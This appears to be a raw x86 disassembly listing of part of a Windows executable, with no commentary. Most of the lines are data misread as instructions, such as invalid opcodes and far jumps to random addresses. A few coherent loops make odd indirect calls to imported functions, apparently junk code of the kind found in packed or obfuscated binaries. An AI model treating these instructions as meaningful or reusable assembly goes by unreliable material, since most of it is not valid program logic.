  40afd9:	shl    DWORD PTR [esi-0x39361a59],0x11
  40afe0:	xchg   DWORD PTR [edx],edi
  40afe2:	xchg   esp,eax
  40afe3:	xchg   ebx,eax
  40afe4:	imul   esp,DWORD PTR [eax-0x31],0x63f2f2de
  40afeb:	and    DWORD PTR [ebp+edx*1+0x8],eax
  40afef:	lods   eax,DWORD PTR ds:[esi]
  40aff0:	cmp    bl,0xec
  40aff3:	xor    DWORD PTR [ebx-0x1f26a00f],0x8c9816e1
  40affd:	pop    edi
  40affe:	ret    
  40afff:	dec    ebp
  40b000:	mul    cl
  40b002:	nop
  40b003:	(bad)  
  40b005:	jne    0x40affa
  40b007:	ror    BYTE PTR [ebx-0x46e3b032],0x40
  40b00e:	out    dx,eax
  40b00f:	dec    ecx
  40b010:	push   0xcfb07500
  40b015:	cmp    ch,BYTE PTR [ebp+0x23abec06]
  40b01b:	mov    dl,0x40
  40b01e:	loope  0x40affc
  40b020:	mov    edi,0x882eb7aa
  40b025:	cld    
  40b026:	scas   eax,DWORD PTR es:[edi]
  40b027:	jno    0x40b077
  40b029:	push   ebx
  40b02a:	push   edx
  40b02b:	push   0xfffffff8
  40b02d:	jl     0x40b082
  40b02f:	or     bh,BYTE PTR ds:0x3437cd01
  40b035:	inc    ebx
  40b036:	mov    eax,DWORD PTR [esi-0x33ea731c]
  40b03c:	cmp    BYTE PTR [esp+eax*4],al
  40b03f:	cmp    ch,BYTE PTR [edx+0x72ee4226]
  40b045:	xchg   ecx,eax
  40b046:	mov    eax,ds:0xa3ae1a9a
  40b04b:	sub    BYTE PTR [edi],0x18
  40b04e:	test   BYTE PTR [edx],ch
  40b050:	jl     0x40aff2
  40b052:	jne    0x40afe8
  40b054:	mov    ah,0x4f
  40b056:	arpl   dx,cx
  40b058:	mov    ecx,0x42abb12b
  40b05d:	sbb    DWORD PTR [ebx],ebp
  40b05f:	mov    edx,0xcd0ef080
  40b064:	retf   
  40b065:	data16 cmp al,0x26
  40b068:	cmp    eax,0xc269b9e5
  40b06d:	sbb    ebp,DWORD PTR [esi+edi*8]
  40b070:	arpl   WORD PTR [eax*1+0x6f176370],di
  40b077:	stos   BYTE PTR es:[edi],al
  40b078:	adc    dh,BYTE PTR [edx-0x4]
  40b07b:	iret   
  40b07c:	xchg   esi,eax
  40b07d:	cmp    eax,DWORD PTR [edx-0x55]
  40b080:	inc    ebp
  40b081:	add    edi,edi
  40b083:	popa   
  40b084:	or     BYTE PTR [ebx+0x42],dl
  40b087:	jns    0x40b0e1
  40b089:	push   ss
  40b08a:	bound  edi,QWORD PTR [edx-0x80]
  40b08d:	in     eax,0xbe
  40b08f:	cmp    DWORD PTR [ebx+0x560956ca],0x1d
  40b096:	aaa    
  40b097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b098:	xchg   ecx,eax
  40b099:	xchg   eax,eax
  40b09b:	pushf  
  40b09c:	xor    eax,edx
  40b09e:	xor    esi,edx
  40b0a0:	add    eax,ecx
  40b0a2:	add    esi,ecx
  40b0a4:	imul   eax,esi
  40b0a7:	mov    esi,DWORD PTR [ebp+0xc]
  40b0aa:	cmp    esi,eax
  40b0ac:	mov    eax,DWORD PTR [ebp-0x4]
  40b0af:	je     0x40aa89
  40b0b5:	xor    eax,edx
  40b0b7:	add    eax,ecx
  40b0b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40b0bc:	imul   eax,ecx
  40b0bf:	add    eax,DWORD PTR [ebp+0x8]
  40b0c2:	mov    DWORD PTR [ebp+0xc],eax
  40b0c5:	mov    eax,DWORD PTR [ebp+0xc]
  40b0c8:	jmp    0x40b2c3
  40b0cd:	fadd   QWORD PTR [edi-0x18]
  40b0d0:	(bad)  
  40b0d1:	ins    DWORD PTR es:[edi],dx
  40b0d2:	jns    0x40b0d0
  40b0d4:	pop    ebp
  40b0d5:	xchg   BYTE PTR [ebx+0xb],cl
  40b0d8:	xor    bl,BYTE PTR [edi-0x62b7bf5b]
  40b0de:	loop   0x40b15e
  40b0e0:	jle    0x40b13e
  40b0e2:	jg     0x40b162
  40b0e4:	jle    0x40b074
  40b0e6:	xchg   esp,eax
  40b0e7:	adc    ecx,ebp
  40b0e9:	scas   al,BYTE PTR es:[edi]
  40b0ea:	xchg   esp,eax
  40b0eb:	retf   
  40b0ec:	jbe    0x40b08e
  40b0ee:	and    eax,0xe35cb95d
  40b0f3:	pop    ds
  40b0f4:	pop    ebx
  40b0f5:	dec    edx
  40b0f6:	fwait
  40b0f7:	jns    0x40b109
  40b0f9:	cli    
  40b0fa:	mov    bl,0x18
  40b0fc:	push   0x41
  40b0fe:	xchg   edx,eax
  40b0ff:	mov    bh,0xa4
  40b101:	xor    ch,cl
  40b103:	aad    0x7
  40b105:	repz push esp
  40b107:	add    edx,DWORD PTR [edx-0x11]
  40b10a:	imul   eax,ebp,0x919fac69
  40b110:	ss (bad) 
  40b112:	enter  0x2132,0x29
  40b116:	pop    esi
  40b117:	test   eax,0x2aff85f0
  40b11c:	leave  
  40b11d:	mul    BYTE PTR [ebx+0x52]
  40b120:	leave  
  40b121:	ficomp WORD PTR [edi+0x70]
  40b124:	(bad)  
  40b125:	outs   dx,DWORD PTR ds:[esi]
  40b126:	cli    
  40b127:	mov    WORD PTR [ebp+0x6a],?
  40b12a:	adc    BYTE PTR [edx+eiz*8+0x36],0x58
  40b12f:	jecxz  0x40b0b3
  40b131:	sub    eax,DWORD PTR [eax+0x9]
  40b134:	stc    
  40b135:	pop    esp
  40b136:	in     al,dx
  40b137:	stos   BYTE PTR es:[edi],al
  40b138:	and    BYTE PTR [esi],0xa7
  40b13b:	jge    0x40b0cf
  40b13d:	mov    ds:0xd516379f,eax
  40b142:	mov    edi,0xa0ed656a
  40b147:	push   ebp
  40b148:	outs   dx,DWORD PTR ds:[esi]
  40b149:	push   0x9b2259bc
  40b14e:	aaa    
  40b14f:	cmp    eax,0x484b53a3
  40b154:	or     ebp,edx
  40b156:	in     eax,dx
  40b157:	pusha  
  40b158:	mov    ah,0xb
  40b15a:	cmp    BYTE PTR [edi+0x3ab23a00],bh
  40b160:	nop
  40b161:	icebp  
  40b162:	imul   eax,ebx,0x8699bd7
  40b168:	sti    
  40b169:	mov    ah,0xe7
  40b16b:	ficom  WORD PTR cs:[ecx-0x6e2c14ad]
  40b172:	loope  0x40b12c
  40b174:	dec    edx
  40b175:	dec    eax
  40b176:	(bad)  
  40b177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b178:	inc    eax
  40b179:	(bad)  
  40b17b:	fmul   st,st(2)
  40b17e:	retf   
  40b17f:	and    eax,0xc34a5bb0
  40b184:	cmp    DWORD PTR [edx-0x5e],0x4011d4c1
  40b18b:	dec    esp
  40b18c:	clc    
  40b18d:	popf   
  40b18e:	fnstcw WORD PTR [edx*1+0x69cd5c7c]
  40b195:	ins    DWORD PTR es:[edi],dx
  40b196:	and    al,0x72
  40b198:	ins    BYTE PTR es:[edi],dx
  40b199:	push   ds
  40b19a:	or     ah,dl
  40b19c:	or     BYTE PTR [ecx+ebp*1-0xa],dl
  40b1a0:	dec    esi
  40b1a1:	sbb    eax,0xc248ab97
  40b1a6:	sbb    eax,0x4aecf9b
  40b1ab:	mov    bh,0x72
  40b1ad:	es out dx,eax
  40b1af:	data16 ja 0x40b166
  40b1b2:	mov    dl,0x69
  40b1b4:	jge    0x40b165
  40b1b6:	mov    ds:0x87a73b5a,al
  40b1bb:	sub    DWORD PTR [ecx+esi*2-0x55],esp
  40b1bf:	mov    al,bh
  40b1c1:	mov    DWORD PTR [ecx+eiz*1+0x72],eax
  40b1c5:	retf   
  40b1c6:	and    BYTE PTR [eax+edx*8],dl
  40b1c9:	icebp  
  40b1ca:	lods   al,BYTE PTR ds:[esi]
  40b1cb:	inc    edx
  40b1cc:	or     al,0xb4
  40b1ce:	stos   BYTE PTR es:[edi],al
  40b1cf:	sbb    BYTE PTR [esi-0x5052a31d],bh
  40b1d5:	jae    0x40b186
  40b1d7:	aaa    
  40b1d8:	xor    DWORD PTR [esi],edx
  40b1da:	das    
  40b1db:	push   edi
  40b1dc:	cmp    eax,0xd70c188b
  40b1e1:	repnz cld 
  40b1e3:	mov    bh,0x92
  40b1e5:	xchg   esi,eax
  40b1e6:	fmul   QWORD PTR [ebx+0x3fdf8815]
  40b1ec:	and    dh,BYTE PTR [esp+ebx*2]
  40b1ef:	scas   eax,DWORD PTR es:[edi]
  40b1f0:	and    edx,DWORD PTR es:[edx]
  40b1f3:	cwde   
  40b1f4:	(bad)  
  40b1f5:	push   edx
  40b1f6:	push   es
  40b1f7:	mov    ecx,0xfda54c0
  40b1fc:	in     al,0x25
  40b1fe:	jbe    0x40b267
  40b200:	iret   
  40b201:	neg    DWORD PTR ds:0xe0d60031
  40b207:	lahf   
  40b208:	out    0xf9,eax
  40b20a:	sar    edx,cl
  40b20c:	mov    ds:0x43fe615b,eax
  40b211:	retf   0xbec2
  40b214:	push   esp
  40b215:	push   esp
  40b216:	hlt    
  40b217:	out    0xcf,eax
  40b219:	cmp    DWORD PTR [edi-0xa],edx
  40b21c:	pop    edi
  40b21d:	fsubp  st(5),st
  40b21f:	sbb    ebx,DWORD PTR [ebx+eax*4-0x11]
  40b223:	jp     0x40b2a2
  40b225:	popf   
  40b226:	stos   BYTE PTR es:[edi],al
  40b227:	mov    dh,0x4a
  40b229:	xor    eax,0xd08860be
  40b22e:	mov    ah,0x4f
  40b230:	push   ebp
  40b231:	or     eax,0xbf95f08b
  40b236:	mov    al,0x99
  40b238:	sahf   
  40b239:	lock iret 
  40b23b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b23c:	clc    
  40b23d:	hlt    
  40b23e:	mov    BYTE PTR ds:0x8057ed0f,dl
  40b244:	mov    dh,0x5d
  40b246:	sub    esi,DWORD PTR [ebx-0x2802593a]
  40b24c:	pop    eax
  40b24d:	and    eax,0x4aab65fa
  40b252:	cmp    ebx,ebp
  40b254:	cli    
  40b255:	add    esp,DWORD PTR [edi]
  40b257:	jae    0x40b260
  40b259:	aam    0x75
  40b25b:	out    dx,eax
  40b25c:	sub    esi,DWORD PTR [edx-0x73ae3523]
  40b262:	mov    ebx,0x3d6e2283
  40b267:	mov    ah,bl
  40b269:	rcr    dh,cl
  40b26b:	add    cl,BYTE PTR ds:0xa81183db
  40b271:	mov    ds:0x6328ef17,al
  40b276:	mov    ds:0x5c48d695,al
  40b27b:	add    ebx,edi
  40b27d:	mov    gs,WORD PTR [esp+eiz*4-0x6]
  40b281:	(bad)  
  40b282:	(bad)  [eax]
  40b284:	mov    WORD PTR [ecx+0x54],cs
  40b287:	dec    edx
  40b288:	out    dx,eax
  40b289:	jle    0x40b2a9
  40b28b:	outs   dx,DWORD PTR ds:[esi]
  40b28c:	cmp    BYTE PTR [edx-0x57a147f2],dl
  40b292:	sahf   
  40b293:	icebp  
  40b294:	scas   al,BYTE PTR es:[di]
  40b296:	ja     0x40b2e1
  40b298:	mov    ch,0xbd
  40b29a:	nop
  40b29b:	(bad)  
  40b29c:	rol    DWORD PTR [edx],1
  40b29e:	in     al,0x0
  40b2a0:	addr16 pop eax
  40b2a2:	inc    edi
  40b2a3:	int3   
  40b2a4:	(bad)  
  40b2a5:	in     eax,dx
  40b2a6:	imul   edx,DWORD PTR [edx+0x1c],0xffffffd4
  40b2aa:	shr    BYTE PTR [ebp-0x54308b90],1
  40b2b0:	cmp    DWORD PTR gs:[eax-0x1075eb9f],esp
  40b2b7:	add    DWORD PTR [esi],ebp
  40b2b9:	push   edi
  40b2ba:	lods   al,BYTE PTR ds:[esi]
  40b2bb:	pop    ss
  40b2bc:	lock in eax,0xa5
  40b2bf:	(bad)
  40b2c2:	ficomp WORD PTR [esi-0x37]
  40b2c5:	ret    0x8
  40b2c8:	push   ebp
  40b2c9:	mov    ebp,esp
  40b2cb:	sub    esp,0x30
  40b2ce:	mov    eax,ds:0x4306ee
  40b2d3:	mov    ecx,DWORD PTR ds:0x4306fa
  40b2d9:	sub    ecx,eax
  40b2db:	imul   eax,DWORD PTR [eax+ecx*1]
  40b2df:	jmp    0x40b43d
  40b2e4:	adc    eax,0x6533e552
  40b2e9:	inc    ebp
  40b2ea:	and    eax,0x241ce54
  40b2ef:	scas   al,BYTE PTR es:[edi]
  40b2f0:	pop    edx
  40b2f1:	retf   
  40b2f2:	mov    bh,0x29
  40b2f4:	sti    
  40b2f5:	in     al,0x7e
  40b2f7:	jle    0x40b338
  40b2f9:	jg     0x40b379
  40b2fb:	jle    0x40b2cf
  40b2fd:	xchg   edi,eax
  40b2fe:	push   0xffffff89
  40b300:	stc    
  40b301:	mov    esp,0xd34116b0
  40b306:	stc    
  40b307:	cwde   
  40b308:	fisub  DWORD PTR ds:0xcb723bbf
  40b30e:	or     eax,0xb87adeb
  40b313:	mov    bh,0xef
  40b315:	outs   dx,BYTE PTR ds:[esi]
  40b316:	add    dl,dh
  40b318:	xchg   ecx,eax
  40b319:	test   ebp,0x1da7c7
  40b31f:	ss push esp
  40b321:	ror    BYTE PTR [ebp-0x1d],cl
  40b324:	leave  
  40b325:	sub    DWORD PTR [edi-0x10],ebp
  40b328:	add    BYTE PTR [eax-0x765509f6],bh
  40b32e:	pop    esp
  40b32f:	sbb    esi,DWORD PTR [edx+edi*2]
  40b332:	jo     0x40b3af
  40b334:	sub    al,0x21
  40b336:	xchg   ebp,eax
  40b337:	jnp    0x40b33d
  40b339:	test   eax,0xe9a8dde5
  40b33e:	adc    DWORD PTR [ebp-0x117d96ed],esi
  40b344:	xchg   ecx,eax
  40b345:	ins    DWORD PTR es:[edi],dx
  40b346:	in     al,dx
  40b347:	xchg   ecx,eax
  40b348:	cld    
  40b349:	dec    ecx
  40b34a:	loopne 0x40b390
  40b34c:	jo     0x40b31a
  40b34e:	pushf  
  40b34f:	push   eax
  40b350:	test   DWORD PTR [ebx],ecx
  40b352:	pop    eax
  40b353:	mov    esi,0x7496007c
  40b358:	jo     0x40b357
  40b35a:	or     eax,0x9b583d2c
  40b35f:	retf   
  40b360:	mov    eax,ds:0x4b9cdb17
  40b365:	loop   0x40b375
  40b367:	test   ebx,0x7fda6fd1
  40b36d:	inc    esi
  40b36e:	test   bh,al
  40b370:	mov    al,ds:0xbe82add0
  40b375:	xlat   BYTE PTR ds:[ebx]
  40b376:	imul   BYTE PTR [edx-0xf]
  40b379:	dec    eax
  40b37a:	out    dx,eax
  40b37b:	or     DWORD PTR [ecx],edx
  40b37d:	inc    edx
  40b37e:	adc    BYTE PTR [ecx-0x7e202756],dl
  40b384:	repnz mov edx,0xbe0b2f44
  40b38a:	leave  
  40b38b:	push   es
  40b38c:	ins    DWORD PTR es:[edi],dx
  40b38d:	out    dx,eax
  40b38e:	test   eax,0x54e4011
  40b393:	or     dh,al
  40b395:	push   edi
  40b396:	retf   
  40b397:	ss leave 
  40b399:	xchg   ecx,eax
  40b39a:	mov    ch,0x0
  40b39c:	in     eax,dx
  40b39d:	xchg   DWORD PTR [esi*8-0x2489398],ecx
  40b3a4:	dec    esp
  40b3a5:	sub    cl,BYTE PTR [edx+esi*4-0x73]
  40b3a9:	sub    BYTE PTR [edx+0x15],bl
  40b3ac:	mov    BYTE PTR [esi+0x57],ch
  40b3af:	arpl   bp,ax
  40b3b1:	stos   BYTE PTR es:[edi],al
  40b3b2:	outs   dx,DWORD PTR ds:[esi]
  40b3b3:	int3   
  40b3b4:	jo     0x40b40c
  40b3b6:	xchg   esi,eax
  40b3b7:	sar    BYTE PTR [edi],1
  40b3b9:	xchg   esi,eax
  40b3ba:	adc    al,0x58
  40b3bc:	out    0xd6,eax
  40b3be:	inc    ecx
  40b3bf:	call   0xe200:0xbb71d53c
  40b3c6:	and    cl,dh
  40b3c8:	fadd   DWORD PTR [eax+0x59]
  40b3cb:	cmc    
  40b3cc:	sub    DWORD PTR [edx+0x38],esi
  40b3cf:	jae    0x40b3f7
  40b3d1:	cmp    ebx,DWORD PTR [esi]
  40b3d3:	ret    0xe029
  40b3d6:	xor    DWORD PTR [ebp+0x38],0xede18f00
  40b3dd:	push   ecx
  40b3de:	(bad)  
  40b3df:	stc    
  40b3e0:	dec    ecx
  40b3e1:	stos   BYTE PTR es:[edi],al
  40b3e2:	adc    ebx,DWORD PTR [ebx-0x45b766ea]
  40b3e8:	inc    ebx
  40b3e9:	sbb    eax,0x9b73a47f
  40b3ee:	mov    edx,ecx
  40b3f0:	pop    edi
  40b3f1:	push   0x19
  40b3f3:	mov    ds:0xfb869563,eax
  40b3f8:	call   0x7c9c40bf
  40b3fd:	outs   dx,DWORD PTR ds:[esi]
  40b3fe:	enter  0xe9cf,0x19
  40b402:	inc    ebx
  40b403:	xchg   esp,eax
  40b404:	inc    ebx
  40b405:	inc    edx
  40b406:	dec    ecx
  40b407:	loope  0x40b3e8
  40b409:	stos   DWORD PTR es:[edi],eax
  40b40a:	mov    esp,0x33cfaece
  40b40f:	(bad)  
  40b410:	mov    edx,0x65a0917b
  40b415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b416:	sub    al,0x57
  40b418:	loope  0x40b484
  40b41a:	call   0x4fc1137d
  40b41f:	ja     0x40b48b
  40b421:	test   eax,0x29c5a099
  40b426:	cmovg  ebx,DWORD PTR [edx]
  40b429:	push   edi
  40b42a:	inc    ebp
  40b42b:	jmp    0xce82:0x3a1cb0dd
  40b432:	in     eax,0x66
  40b434:	shl    DWORD PTR [ebx+edx*4],cl
  40b437:	sub    eax,0x434e629
  40b43c:	test   edi,0x8535fc45
  40b442:	pushf  
  40b443:	clc    
  40b444:	mov    DWORD PTR ds:0x4306ce,0x11
  40b44e:	cmp    DWORD PTR ds:0x4306ce,0x0
  40b455:	je     0x40b489
  40b45b:	cmp    DWORD PTR ds:0x4306ce,0x19
  40b462:	jne    0x40b479
  40b468:	push   DWORD PTR [ebp-0x24]
  40b46b:	push   DWORD PTR [ebp-0x20]
  40b46e:	push   0x41ff
  40b473:	call   DWORD PTR ds:0x42ec68
  40b479:	mov    eax,ds:0x4306ce
  40b47e:	dec    eax
  40b47f:	mov    ds:0x4306ce,eax
  40b484:	jmp    0x40b44e
  40b489:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40b490:	or     eax,0x1c5c
  40b495:	mov    ecx,DWORD PTR [ebp-0x4]
  40b498:	push   ebx
  40b499:	add    DWORD PTR ds:0x43062e,edi
  40b49f:	mov    eax,0x7510856
  40b4a4:	mov    ebx,DWORD PTR ds:0x4306c2
  40b4aa:	sbb    DWORD PTR ds:0x42e8e2,ebx
  40b4b0:	xor    ecx,eax
  40b4b2:	mov    ebx,DWORD PTR ds:0x42ef94
  40b4b8:	sub    DWORD PTR ds:0x43060e,ebx
  40b4be:	mov    ebx,0x32729d
  40b4c3:	xor    DWORD PTR ds:0x4306c6,0xece
  40b4cd:	add    ecx,ebx
  40b4cf:	xor    DWORD PTR ds:0x430616,0x42e8ea
  40b4d9:	mov    DWORD PTR [ebp-0x1c],ecx
  40b4dc:	mov    ecx,DWORD PTR [ebp+0x14]
  40b4df:	xor    DWORD PTR ds:0x42ef9c,0x65f3
  40b4e9:	push   esi
  40b4ea:	sub    DWORD PTR ds:0x42e8e2,0x2022
  40b4f4:	push   edi
  40b4f5:	and    DWORD PTR ds:0x4306c6,0x430612
  40b4ff:	test   ecx,ecx
  40b501:	mov    DWORD PTR ds:0x42e8de,0x17b6
  40b50b:	je     0x40b58a
  40b511:	add    ecx,0x2345
  40b517:	mov    ecx,DWORD PTR [ebp+0x14]
  40b51a:	and    DWORD PTR ds:0x430626,0x0
  40b524:	jmp    0x40b536
  40b529:	mov    edi,DWORD PTR ds:0x430626
  40b52f:	inc    edi
  40b530:	mov    DWORD PTR ds:0x430626,edi
  40b536:	cmp    DWORD PTR ds:0x430626,0x1d
  40b53d:	jae    0x40b585
  40b543:	cmp    DWORD PTR ds:0x430626,0x4
  40b54a:	jne    0x40b560
  40b550:	push   0x42ef9c
  40b555:	push   0x6d9e
  40b55a:	call   DWORD PTR ds:0x42ec6c
  40b560:	cmp    DWORD PTR ds:0x430626,0x3
  40b567:	jne    0x40b57a
  40b56d:	mov    edi,DWORD PTR ds:0x430626
  40b573:	inc    edi
  40b574:	mov    DWORD PTR ds:0x430626,edi
  40b57a:	jmp    0x40b529
  40b57f:	and    esi,0x3dcd
  40b585:	mov    ecx,DWORD PTR [ecx]
  40b587:	mov    DWORD PTR [ebp-0x1c],ecx
  40b58a:	movzx  esi,BYTE PTR ds:0x430612
  40b591:	xor    DWORD PTR ds:0x43063a,esi
  40b597:	imul   edx,eax
  40b59a:	or     DWORD PTR ds:0x43063e,edx
  40b5a0:	mov    ecx,0x4573
  40b5a5:	xor    esi,DWORD PTR ds:0x430606
  40b5ab:	add    edx,ecx
  40b5ad:	mov    esi,0x7879
  40b5b2:	and    DWORD PTR ds:0x4306be,0x0
  40b5bc:	mov    edi,DWORD PTR ds:0x4306be
  40b5c2:	inc    edi
  40b5c3:	mov    DWORD PTR ds:0x4306be,edi
  40b5c9:	cmp    DWORD PTR ds:0x4306be,0x12
  40b5d0:	jne    0x40b5f7
  40b5d6:	push   0x1
  40b5d8:	push   0x3333
  40b5dd:	push   0x7164
  40b5e2:	push   0x26d7
  40b5e7:	push   0x1d14
  40b5ec:	push   0x64d6
  40b5f1:	call   DWORD PTR ds:0x42ec70
  40b5f7:	cmp    DWORD PTR ds:0x4306be,0x11
  40b5fe:	jne    0x40b613
  40b604:	xor    edi,edi
  40b606:	or     edi,DWORD PTR ds:0x4306be
  40b60c:	inc    edi
  40b60d:	mov    DWORD PTR ds:0x4306be,edi
  40b613:	cmp    DWORD PTR ds:0x4306be,0x1f
  40b61a:	jb     0x40b5bc
  40b620:	dec    edi
  40b621:	mov    edi,0x1556
  40b626:	xchg   esi,ecx
  40b628:	sub    edx,edi
  40b62a:	xor    esi,esi
  40b62c:	jmp    0x40b78a
  40b631:	mov    ch,dh
  40b633:	add    esi,DWORD PTR [eax+0x7b]
  40b636:	aad    0x9d
  40b638:	jl     0x40b646
  40b63a:	mov    eax,0xd45a4dc4
  40b63f:	or     eax,0x7ee5bcc4
  40b644:	jle    0x40b685
  40b646:	jg     0x40b6c6
  40b648:	jle    0x40b668
  40b64a:	cld    
  40b64b:	xchg   ebp,eax
  40b64c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b64d:	imul   ebx,DWORD PTR [edx-0x1e],0xffffffbc
  40b651:	pop    eax
  40b652:	stos   DWORD PTR es:[edi],eax
  40b653:	iret   
  40b654:	dec    esp
  40b655:	xchg   ebp,eax
  40b656:	(bad)  
  40b657:	push   ebx
  40b658:	bound  ecx,QWORD PTR [edx+ebx*4+0x340af6ab]
  40b65f:	cmp    ebp,edx
  40b661:	cmp    eax,esi
  40b663:	cli    
  40b664:	or     dh,BYTE PTR [edi]
  40b666:	and    eax,0x18cead41
  40b66b:	outs   dx,DWORD PTR ds:[esi]
  40b66c:	icebp  
  40b66d:	sbb    BYTE PTR [eax-0x2f],ah
  40b670:	jl     0x40b683
  40b672:	push   edi
  40b673:	ins    DWORD PTR es:[edi],dx
  40b674:	int    0xa6
  40b676:	pop    ebp
  40b677:	sbb    DWORD PTR [edi-0x6fb45dd6],0x49
  40b67e:	fidiv  DWORD PTR [ecx-0x80]
  40b681:	mov    eax,DWORD PTR [edi]
  40b683:	mov    esp,0x531b1798
  40b688:	ss sub dl,dh
  40b68b:	pop    ecx
  40b68c:	mov    DWORD PTR [edx],edx
  40b68e:	loopne 0x40b629
  40b690:	into   
  40b691:	xchg   edx,eax
  40b692:	jp     0x40b688
  40b694:	lock adc BYTE PTR [ebp+0x2ef0760e],al
  40b69b:	sub    al,0xdd
  40b69d:	mov    ds:0x9d06a45,eax
  40b6a2:	push   ds
  40b6a3:	and    al,0xc
  40b6a5:	or     BYTE PTR [eax-0x3f],bh
  40b6a8:	and    al,0x5a
  40b6aa:	xchg   ecx,eax
  40b6ab:	out    dx,al
  40b6ac:	mov    BYTE PTR [edi-0x53],ch
  40b6af:	jo     0x40b69c
  40b6b1:	das    
  40b6b2:	cmp    al,0x4a
  40b6b4:	adc    al,0xad
  40b6b6:	sbb    BYTE PTR [edi],bl
  40b6b8:	inc    BYTE PTR [edi-0x3f]
  40b6bb:	sub    al,0x55
  40b6bd:	(bad)  
  40b6bf:	mov    ?,WORD PTR [eax+0x54]
  40b6c2:	dec    edi
  40b6c3:	out    0xe9,al
  40b6c5:	fisub  DWORD PTR ds:0x334af0f
  40b6cb:	ja     0x40b70b
  40b6cd:	outs   dx,BYTE PTR ds:[esi]
  40b6ce:	(bad)  
  40b6cf:	mov    eax,0xd5749692
  40b6d4:	push   ebx
  40b6d5:	cld    
  40b6d6:	xchg   edx,eax
  40b6d7:	add    BYTE PTR [ecx],dh
  40b6d9:	mov    edi,0x5ffe1cb4
  40b6de:	repnz test eax,0x486baa47
  40b6e4:	enter  0xe22c,0x97
  40b6e8:	mov    al,BYTE PTR [esi-0x62383754]
  40b6ee:	mov    al,BYTE PTR [edi-0x9cb8c96]
  40b6f4:	mov    WORD PTR [esi-0x62],?
  40b6f7:	out    0x73,eax
  40b6f9:	call   0xe99e:0xc1f2ae38
  40b700:	iret   
  40b701:	mov    cl,BYTE PTR [edi+0xa37c8c0]
  40b707:	jmp    0xd4a5:0x13506a3
  40b70e:	sub    BYTE PTR [edi],dh
  40b710:	out    0xfb,al
  40b712:	adc    eax,0x55ab828b
  40b717:	dec    esp
  40b718:	retf   
  40b719:	sbb    ecx,0x8d4fb54b
  40b71f:	(bad)  
  40b720:	jmp    DWORD PTR [ebx-0x5]
  40b723:	std    
  40b724:	dec    ebx
  40b725:	fstp   DWORD PTR [esi-0x4f]
  40b728:	mov    eax,ds:0x2141a134
  40b72d:	or     al,0xeb
  40b72f:	cmp    eax,0x6e3a9b25
  40b734:	jbe    0x40b76c
  40b736:	pop    ss
  40b737:	(bad)  [edx-0x15]
  40b73a:	jmp    0x40b6d2
  40b73c:	dec    edi
  40b73d:	out    dx,al
  40b73e:	loop   0x40b74d
  40b740:	mov    DWORD PTR [eax-0x67c995b4],eax
  40b746:	loopne 0x40b76a
  40b748:	adc    al,0xcd
  40b74a:	cmp    DWORD PTR [ebx+0x61cb5e92],eax
  40b750:	cmp    ebx,DWORD PTR [ebx+0x214cfb90]
  40b756:	loopne 0x40b77c
  40b758:	lahf   
  40b759:	(bad)  
  40b75a:	adc    edi,DWORD PTR [eax]
  40b75c:	xor    bh,BYTE PTR [ebx-0x1e]
  40b75f:	mov    al,cl
  40b761:	out    0xd6,eax
  40b763:	loop   0x40b6ed
  40b765:	adc    edx,DWORD PTR [edx-0x6]
  40b768:	repz jnp 0x40b757
  40b76b:	jmp    0x3f3f:0xdedef83
  40b772:	sbb    eax,0xfaf6926c
  40b777:	or     edi,DWORD PTR [esi-0x6013b0a1]
  40b77d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b77e:	jns    0x40b711
  40b780:	cmp    dh,BYTE PTR [eax]
  40b782:	dec    ebx
  40b783:	rcr    DWORD PTR ds:0x4e4dd04e,cl
  40b789:	pop    ss
  40b78a:	mov    DWORD PTR [ebp-0x28],esi
  40b78d:	and    DWORD PTR ds:0x430632,ebx
  40b793:	mov    DWORD PTR [ebp-0x2c],esi
  40b796:	or     ecx,DWORD PTR ds:0x4306c2
  40b79c:	jmp    0x40b8fa
  40b7a1:	gs inc edi
  40b7a3:	xor    eax,0x657cedde
  40b7a8:	pop    ebp
  40b7a9:	xchg   edx,eax
  40b7aa:	lods   al,BYTE PTR ds:[esi]
  40b7ab:	mov    al,ds:0xb7005497
  40b7b0:	cwde   
  40b7b1:	jge    0x40b799
  40b7b3:	jle    0x40b833
  40b7b5:	aas    
  40b7b6:	jg     0x40b836
  40b7b8:	jle    0x40b7b2
  40b7ba:	cmp    DWORD PTR [eax-0x6c],0x87252d0b
  40b7c1:	into   
  40b7c2:	or     eax,0xeda815a
  40b7c7:	xchg   ebp,eax
  40b7c8:	test   BYTE PTR [eax-0x5b85a4df],cl
  40b7ce:	add    al,0xb5
  40b7d0:	add    ch,ah
  40b7d2:	data16 lods al,BYTE PTR ds:[esi]
  40b7d4:	jp     0x40b83b
  40b7d6:	add    dh,ch
  40b7d8:	(bad)  
  40b7d9:	enter  0xb508,0xd7
  40b7dd:	mov    eax,ds:0x3a02f5e9
  40b7e2:	cmc    
  40b7e3:	in     al,dx
  40b7e4:	in     al,0xb6
  40b7e6:	loop   0x40b7e2
  40b7e8:	in     al,0x75
  40b7ea:	pop    esi
  40b7eb:	jge    0x40b771
  40b7ed:	or     eax,0x133fa5f
  40b7f2:	push   edx
  40b7f3:	add    ch,bl
  40b7f5:	dec    ebx
  40b7f6:	adc    BYTE PTR [edi+0xf0c2860],dl
  40b7fc:	xchg   edx,eax
  40b7fd:	mov    edx,DWORD PTR ds:[edi+0x27]
  40b801:	out    0x17,al
  40b803:	out    0x53,eax
  40b805:	aam    0xf5
  40b807:	xchg   edi,eax
  40b808:	dec    esi
  40b809:	jg     0x40b855
  40b80b:	sub    DWORD PTR [esi+0x4a],esp
  40b80e:	pushf  
  40b80f:	pop    edx
  40b810:	inc    ebp
  40b811:	inc    edi
  40b812:	jmp    0x2378:0x1d6fe7b3
  40b819:	sub    BYTE PTR [edx],dh
  40b81b:	sbb    eax,0x42d7ea31
  40b820:	and    BYTE PTR [edi],bl
  40b822:	nop
  40b823:	and    al,0x78
  40b825:	retf   
  40b826:	std    
  40b827:	sub    BYTE PTR [edi],bh
  40b829:	sub    BYTE PTR [edx+eiz*1-0x66c66f0],0x3f
  40b831:	lahf   
  40b832:	call   0xecb77219
  40b837:	popa   
  40b838:	mov    eax,ds:0x679a31db
  40b83d:	icebp  
